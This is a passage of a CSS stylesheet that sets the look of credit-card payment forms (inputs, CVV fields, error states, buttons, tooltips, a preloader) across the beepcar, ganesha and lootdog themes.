.pay-card_type_beepcar .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_beepcar .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_beepcar .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_beepcar .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f54545
}

.pay-card_type_beepcar .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f54545
}

.pay-card-layout_type_beepcar .credit-card-form__popup .button,
.pay-card_type_beepcar .credit-card-form__submit .button {
	color: #fff;
	border-radius: 3px;
	-webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .12), 0 0 2px 0 rgba(0, 0, 0, .12);
	width: 100%;
	height: 48px;
	margin: 0;
	line-height: 48px;
	font-size: 14px;
	font-weight: 500;
	letter-spacing: .5px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_beepcar .credit-card-form__popup .button,
.pay-card-layout_type_beepcar .credit-card-form__popup .button:active,
.pay-card-layout_type_beepcar .credit-card-form__popup .button:hover,
.pay-card_type_beepcar .credit-card-form__submit .button,
.pay-card_type_beepcar .credit-card-form__submit .button:active,
.pay-card_type_beepcar .credit-card-form__submit .button:hover {
	background: #24d07a
}

.pay-card-layout_type_beepcar .credit-card-form__popup .button {
	width: auto;
	padding: 0 24px
}

.pay-card-layout_type_beepcar .credit-card-form__popup .info-block .title,
.pay-card-layout_type_beepcar .notification-block .title {
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card-layout_type_beepcar .credit-card-form__popup .info-block .paragraph,
.pay-card-layout_type_beepcar .info-block .paragraph {
	margin: 0 0 35px;
	font-size: 14px;
	line-height: 1.57;
	color: #8f8f8f
}

.pay-card-layout_type_beepcar .credit-card-form__popup .info-block .paragraph_color_red {
	color: #8f8f8f
}

.pay-card-layout_type_beepcar .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table,
.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card-layout_type_beepcar .notification-block .payment-info-table__caption,
.pay-card-layout_type_beepcar .notification-block .payment-info-table__cell,
.pay-card-layout_type_beepcar .notification-block .payment-info-table__head {
	letter-spacing: -.3px
}

.pay-card-layout_type_beepcar .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card-layout_type_beepcar .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.pay-card_type_beepcar .credit-card-form__tooltip {
	left: auto;
	right: 0;
	top: -60px;
	width: 200px;
	padding: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #fff;
	background-color: rgba(73, 73, 73, .9);
	-webkit-box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	line-height: 22px;
	text-align: left;
	white-space: normal
}

.pay-card_type_beepcar .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 17px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(73, 73, 73, .9);
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_beepcar .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

select.control__select_type_beepcar {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_beepcar .pay-card__card-selector:before {
	position: absolute;
	top: 48px;
	display: block;
	right: 8px;
	width: 13px;
	height: 7px;
	background: none;
	font-family: tahoma;
	content: "\203A";
	-webkit-transform: rotate(90deg);
	-o-transform: rotate(90deg);
	transform: rotate(90deg);
	font-size: 24px;
	color: #ccc;
	pointer-events: none
}

.pay-card-layout_type_beepcar .secure-information {
	max-width: 360px;
	margin: 0 auto;
	padding: 0 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	font-family: Roboto, arial, helvetica;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_beepcar .secure-information .secure-information__icon {
	margin: 0
}

.pay-card-layout_type_beepcar .secure-information .secure-information__text {
	margin: 0;
	font-size: 14px;
	line-height: 22px;
	color: #2a2a2a
}

.pay-card-layout_type_beepcar .secure-information .secure-information__text_type_protocol {
	display: inline-block;
	margin: 0 5px 0 0;
	color: #24d07a
}

.body_background_ganesha {
	height: 100%
}

.pay-card-layout_type_ganesha {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	padding: 15px 10px 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	min-height: 100%;
	margin: 0 auto;
	max-width: 420px
}

.pay-card_type_ganesha .credit-card-form__popup-overlay {
	position: fixed;
	top: 0;
	bottom: 0;
	left: 0;
	right: 0;
	z-index: 3
}

.pay-card_type_ganesha {
	position: static;
	width: 100%;
	min-width: 250px;
	margin: 0 auto;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica;
	font-size: 13px;
	line-height: 17px;
	color: #797979;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_ganesha .pay-card__row {
	position: relative;
	padding: 0
}

.pay-card_type_ganesha .credit-card-form__label-group_type_add-card,
.pay-card_type_ganesha .pay-card__card-selector,
.pay-card_type_ganesha .pay-card__remove-card,
.pay-card_type_ganesha .pay-card__remove-card-icon,
.pay-card_type_ganesha .pay-card__remove-card-text {
	display: none!important
}

.pay-card_type_ganesha .pay-card__card {
	width: auto
}

.pay-card_type_ganesha .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_ganesha .pay-card__message {
	text-align: left
}

.pay-card_type_ganesha .credit-card-form__card-wrapper {
	position: relative;
	margin-bottom: 15px
}

.pay-card_type_ganesha .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_ganesha .credit-card-form__card_position_front {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 20px;
	background: rgba(0, 0, 0, .12);
	border-radius: 8px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_ganesha .credit-card-form__card-wrapper .payment-systems-icons {
	display: none
}

.pay-card-layout_type_ganesha .payment-systems-icons {
	margin: auto auto 15px;
	width: 100%;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	opacity: .3;
	padding: 0 28px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_ganesha .credit-card-form__label-group_type_card-number,
.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date {
	margin: 0 0 10px;
	padding: 0
}

.pay-card_type_ganesha .credit-card-form__label-group_type_holder-name {
	margin: 0;
	-webkit-box-ordinal-group: 2;
	-webkit-order: 1;
	order: 1
}

.pay-card_type_ganesha .control-label__text,
.pay-card_type_ganesha .credit-card-form__title {
	display: block;
	margin: 0;
	text-transform: none;
	font-size: 13px;
	color: #2a2a2a;
	line-height: 17px;
	letter-spacing: -.1px;
	padding-bottom: 3px
}

.pay-card_type_ganesha .credit-card-form__input {
	height: 32px;
	line-height: 32px;
	color: #333;
	background: #fff;
	border-color: transparent transparent hsla(0, 0%, 100%, .2);
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding: 0 10px;
	letter-spacing: -.3px
}

.pay-card_type_ganesha .credit-card-form__input::-webkit-input-placeholder {
	color: #797979;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_ganesha .credit-card-form__input::-moz-placeholder {
	color: #797979;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_ganesha .credit-card-form__input::placeholder {
	color: #797979;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_ganesha .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: transparent transparent #fff
}

.pay-card_type_ganesha .credit-card-form__input[disabled] {
	opacity: .7
}

.pay-card_type_ganesha .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	display: inline-block;
	width: 110px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date .credit-card-form__label.credit-card-form__label_type_cvv {
	width: 65px
}

.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_ganesha .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	float: right;
	margin: 0;
	padding: 0
}

.pay-card_type_ganesha .credit-card-form__terms {
	width: 60%;
	margin: 20px auto 15px;
	text-align: center;
	font-size: 11px;
	color: #797979;
	letter-spacing: .1px
}

@media (max-width:320px) {
	.pay-card_type_ganesha .credit-card-form__terms {
		width: 80%
	}
}

.pay-card_type_ganesha .credit-card-form__terms-link {
	color: #e63232
}

.pay-card_type_ganesha .credit-card-form__error-text,
.pay-card_type_ganesha .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_ganesha .credit-card-form__label,
.pay-card_type_ganesha .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_ganesha .credit-card-form__label_error_yes:after {
	position: absolute;
	bottom: 0;
	right: 10px;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%);
	width: 16px;
	height: 16px;
	text-align: center;
	content: "!";
	background: #ff2e2e;
	border-radius: 50%;
	font-size: 13px;
	line-height: 15px;
	font-weight: 700;
	color: #fff
}

.pay-card_type_ganesha .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none
}

.pay-card_type_ganesha .credit-card-form__submit-inner {
	margin: 0 0 20px
}

.pay-card_type_ganesha .credit-card-form__popup .button,
.pay-card_type_ganesha .credit-card-form__submit .button {
	color: #fff;
	border-radius: 4px;
	width: 100%;
	height: 44px;
	margin: 0;
	line-height: 44px;
	font-size: 15px;
	font-weight: 400;
	text-transform: none;
	letter-spacing: -.2px
}

.pay-card_type_ganesha .credit-card-form__popup .button,
.pay-card_type_ganesha .credit-card-form__popup .button:active,
.pay-card_type_ganesha .credit-card-form__popup .button:hover,
.pay-card_type_ganesha .credit-card-form__submit .button,
.pay-card_type_ganesha .credit-card-form__submit .button:active,
.pay-card_type_ganesha .credit-card-form__submit .button:hover {
	background: #e63232
}

.pay-card_type_ganesha .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_ganesha .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_ganesha .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_ganesha .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_ganesha .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_ganesha .credit-card-form__submit .button.button_disabled_yes:hover {
	background: rgba(230, 50, 50, .12);
	color: #fff;
	cursor: default
}

.pay-card_type_ganesha .credit-card-form__popup .button {
	width: auto;
	padding: 0 24px
}

.body_background_ganesha .notification-block .title,
.pay-card_type_ganesha .credit-card-form__popup .info-block .title {
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #2a2a2a
}

.body_background_ganesha .info-block .paragraph,
.pay-card_type_ganesha .credit-card-form__popup .info-block .paragraph {
	margin: 0 0 35px;
	font-size: 13px;
	line-height: 17px;
	color: #797979
}

.pay-card_type_ganesha .credit-card-form__popup .info-block .paragraph_color_red {
	color: #797979
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table,
.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card_type_ganesha .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 13px;
	line-height: 17px;
	color: #797979;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card_type_ganesha .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_ganesha .notification-block .payment-info-table__caption,
.pay-card_type_ganesha .notification-block .payment-info-table__cell,
.pay-card_type_ganesha .notification-block .payment-info-table__head {
	letter-spacing: -.3px
}

.pay-card_type_ganesha .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_ganesha .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.secure-information_type_ganesha {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	margin: 0 auto 15px;
	text-align: center
}

.secure-information_type_ganesha .secure-information__icon {
	position: absolute;
	left: 0;
	margin: 0;
	top: 50%;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%)
}

.secure-information_type_ganesha .secure-information__text {
	position: relative;
	display: inline-block;
	padding-left: 35px;
	color: #797979;
	font-size: 11px;
	font-family: Roboto, arial, helvetica;
	-webkit-font-smoothing: antialiased;
	letter-spacing: .1px;
	text-align: left
}

.pay-card-layout_type_ganesha .credit-card-form__columns {
	margin: 0 20px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card-layout_type_ganesha .credit-card-form__column_type_left,
.pay-card-layout_type_ganesha .credit-card-form__column_type_right {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_ganesha .credit-card-form__column_type_left {
	text-align: left
}

.pay-card-layout_type_ganesha .credit-card-form__column_title {
	color: #797979;
	font-size: 14px;
	letter-spacing: -.15px
}

.pay-card-layout_type_ganesha .credit-card-form__column_type_right {
	text-align: right
}

.pay-card-layout_type_ganesha .credit-card-form__column_value {
	color: #333;
	font-size: 16px;
	letter-spacing: -.32px
}

.ganesha-icon_name_preloader {
	width: 45px;
	height: 30px;
	position: fixed;
	top: 50%;
	left: 50%;
	z-index: 999;
	-webkit-transform: translate3d(-50%, -50%, 0);
	transform: translate3d(-50%, -50%, 0)
}

.ganesha-icon_name_preloader:after,
.ganesha-icon_name_preloader:before {
	content: "";
	width: 15px;
	height: 15px;
	border-radius: 50%;
	position: absolute;
	top: 50%
}

.ganesha-icon_name_preloader:before {
	background-color: rgba(0, 0, 0, .12);
	left: 50%;
	-webkit-animation: ganesha-animation_type_left-ball 1.8s infinite ease-in-out;
	-o-animation: ganesha-animation_type_left-ball 1.8s infinite ease-in-out;
	animation: ganesha-animation_type_left-ball 1.8s infinite ease-in-out
}

.ganesha-icon_name_preloader:after {
	background-color: #e63232;
	right: 50%;
	-webkit-animation: ganesha-animation_type_right-ball 1.8s infinite ease-in-out;
	-o-animation: ganesha-animation_type_right-ball 1.8s infinite ease-in-out;
	animation: ganesha-animation_type_right-ball 1.8s infinite ease-in-out
}

.pay-card-layout_type_ganesha .credit-card-form__column_value {
	font-family: Roboto, Arial, sans-serif
}

@-webkit-keyframes ganesha-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-o-keyframes ganesha-animation_type_left-ball {
	0%,
	to {
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		transform: translate3d(-150%, -50%, 0)
	}
}

@keyframes ganesha-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-webkit-keyframes ganesha-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

@-o-keyframes ganesha-animation_type_right-ball {
	0%,
	to {
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		transform: translate3d(150%, -50%, 0)
	}
}

@keyframes ganesha-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

.body_background_lootdog,
.pay-card-layout_type_lootdog .credit-card-form__popup {
	background: #24252a
}

.pay-card-layout_type_lootdog .credit-card-form__popup,
.pay-card-layout_type_lootdog .pay-card_type_lootdog {
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	line-height: 22px;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block,
.pay-card-layout_type_lootdog .pay-card_type_lootdog {
	width: 60%;
	min-width: 290px;
	padding: 5px 12px 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block,
	.pay-card-layout_type_lootdog .pay-card_type_lootdog {
		width: 440px
	}
}

.pay-card-layout_type_lootdog .pay-card_type_lootdog {
	position: static;
	margin: 0 auto 6px
}

.pay-card-layout_type_lootdog .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0
}

.pay-card-layout_type_lootdog .pay-card__select-card {
	display: block
}

.pay-card-layout_type_lootdog .pay-card__select-card .control {
	margin-right: 0
}

.pay-card-layout_type_lootdog .pay-card__select-card .selectBox.control__select {
	padding: 7px 4px
}

.pay-card-layout_type_lootdog .pay-card__select-card .control__select {
	font-size: 15px;
	width: 100%;
	padding: 7px 14px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	-webkit-box-shadow: none;
	box-shadow: none;
	border-radius: 4px;
	background: #36373b;
	font-family: Roboto, arial, helvetica;
	color: #f5f5f7;
	border-color: #595959;
	height: 42px
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .pay-card__select-card .control__select {
		height: 32px
	}
}

.pay-card-layout_type_lootdog .control__select.selectBox-dropdown .selectBox-label {
	padding-top: 2px
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .control__select.selectBox-dropdown .selectBox-label {
		padding-top: 4px;
		margin-top: -7px
	}
}

.pay-card-layout_type_lootdog .pay-card__remove-card {
	display: inline-block;
	margin: 0 0 15px;
	color: #00AD64;
	line-height: 18px;
	position: absolute;
	top: 0;
	right: 0
}

.pay-card-layout_type_lootdog .pay-card__remove-card-icon {
	display: none
}

.pay-card-layout_type_lootdog .pay-card__card {
	width: auto
}

.pay-card-layout_type_lootdog .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card-layout_type_lootdog .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card,
.pay-card-layout_type_lootdog .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card-layout_type_lootdog .pay-card__card_type_added-card .payment-systems-icons {
	display: none
}

.pay-card-layout_type_lootdog .pay-card__message {
	text-align: left
}

.pay-card-layout_type_lootdog .credit-card-form__card-wrapper {
	position: relative
}

.pay-card-layout_type_lootdog .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card-layout_type_lootdog .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto 10px;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_lootdog .payment-systems-icons {
	position: absolute;
	right: 10px;
	top: 45px
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .payment-systems-icons {
		top: 42px
	}
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card-layout_type_lootdog .payment-systems-icon {
	margin: 0 0 0 5px;
	float: right
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_card-number {
	clear: both;
	margin: 0 0 15px
}

.pay-card-layout_type_lootdog .control-label__text,
.pay-card-layout_type_lootdog .credit-card-form__title {
	display: block;
	margin: 0 0 5px;
	text-transform: none;
	font-size: 15px;
	color: #f5f5f7;
	line-height: 1.57
}

.pay-card-layout_type_lootdog .credit-card-form__input {
	background: #36373b;
	border-color: #595959;
	color: #f5f5f7;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 15px;
	font-family: Roboto, arial, helvetica;
	font-style: normal;
	letter-spacing: 0;
	padding-left: 12px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	height: 42px
}

.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill,
.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill:hover {
	border-color: #595959
}

.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill:focus {
	border-color: #979797
}

.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill,
.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill:focus,
.pay-card-layout_type_lootdog .credit-card-form__input-webkit-autofill:hover {
	-webkit-text-fill-color: $text_color;
	caret-color: $text_color;
	-webkit-box-shadow: 0 0 0 9999px $background_color inset!important
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .credit-card-form__input {
		height: 32px
	}
}

.pay-card-layout_type_lootdog .credit-card-form__input::-webkit-input-placeholder {
	color: #676767;
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	text-transform: none;
	letter-spacing: .4px
}

.pay-card-layout_type_lootdog .credit-card-form__input::-moz-placeholder {
	color: #676767;
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	text-transform: none;
	letter-spacing: .4px
}

.pay-card-layout_type_lootdog .credit-card-form__input::placeholder {
	color: #676767;
	font-family: Roboto, arial, helvetica;
	font-size: 15px;
	text-transform: none;
	letter-spacing: .4px
}

.pay-card-layout_type_lootdog .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: #979797
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_add-card {
	margin: 0 0 20px
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_add-card .credit-card-form__label {
	-webkit-tap-highlight-color: transparent;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	color: #d4d4d4;
	font-size: 14px
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card-layout_type_lootdog [type=checkbox]+.credit-card-form__input-icon {
	-webkit-tap-highlight-color: transparent;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	display: inline-block;
	margin: -3px 10px 0 0;
	padding: 2px;
	vertical-align: middle;
	width: 14px;
	height: 14px;
	border-radius: 2px;
	border: 1px solid #595959;
	background: #36373b
}

.pay-card-layout_type_lootdog [type=checkbox]:checked+.credit-card-form__input-icon {
	-webkit-tap-highlight-color: transparent;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	padding: 3px;
	border: none;
	background: #00a5ff
}

.pay-card-layout_type_lootdog [type=checkbox]:checked+.credit-card-form__input-icon:after {
	-webkit-tap-highlight-color: transparent;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card-layout_type_lootdog .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card-layout_type_lootdog .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card-layout_type_lootdog .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	margin: 0;
	padding: 0 0 0 6px;
	position: relative
}

.pay-card-layout_type_lootdog .credit-card-form__cvv-icon,
.pay-card-layout_type_lootdog .credit-card-form__cvv-icon:hover,
.pay-card-layout_type_lootdog .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card-layout_type_lootdog .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: 40px;
	left: auto;
	right: 13px;
	border-radius: 10px;
	background-image: none;
	background-color: transparent;
	text-align: center;
	color: #fff;
	cursor: pointer;
	-webkit-tap-highlight-color: transparent
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .credit-card-form__cvv-icon {
		top: 34px
	}
}

.pay-card-layout_type_lootdog .credit-card-form__cvv-icon:before {
	-webkit-tap-highlight-color: transparent;
	display: inline-block;
	content: "";
	font-size: 15px;
	line-height: 15px
}

.pay-card-layout_type_lootdog .credit-card-form__terms-link {
	color: #1287c9
}

.pay-card-layout_type_lootdog .credit-card-form__error-text {
	display: none;
	color: #f54545;
	text-transform: none;
	font-size: 13px;
	line-height: 18px;
	letter-spacing: .4px;
	position: relative;
	margin: 5px 0 0
}

.pay-card-layout_type_lootdog .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none;
	width: 100%;
	margin: 5px 0 0
}

.pay-card-layout_type_lootdog .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card-layout_type_lootdog .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card-layout_type_lootdog .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card-layout_type_lootdog .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card-layout_type_lootdog .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f54545;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card-layout_type_lootdog .credit-card-form__popup .button,
.pay-card-layout_type_lootdog .credit-card-form__submit .button {
	color: #f5f5f5;
	border-radius: 3px;
	-webkit-tap-highlight-color: transparent;
	width: 100%;
	margin: 0;
	height: 42px;
	line-height: 42px;
	font-size: 14px;
	font-weight: 500;
	letter-spacing: .5px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica
}

.pay-card-layout_type_lootdog .credit-card-form__popup .button,
.pay-card-layout_type_lootdog .credit-card-form__popup .button:active,
.pay-card-layout_type_lootdog .credit-card-form__popup .button:hover,
.pay-card-layout_type_lootdog .credit-card-form__submit .button,
.pay-card-layout_type_lootdog .credit-card-form__submit .button:active,
.pay-card-layout_type_lootdog .credit-card-form__submit .button:hover {
	background: #00a5ff
}

